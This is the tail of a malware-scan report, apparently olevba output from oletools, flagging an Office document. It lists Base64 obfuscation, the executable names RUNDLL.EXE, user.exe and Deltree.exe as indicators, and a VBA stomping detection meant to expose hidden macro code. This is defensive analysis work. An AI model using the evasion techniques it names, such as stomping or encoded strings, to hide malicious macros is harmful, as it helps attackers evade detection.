|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |RUNDLL.EXE          |Executable file name                         |
|IOC       |user.exe            |Executable file name                         |
|IOC       |Deltree.exe         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

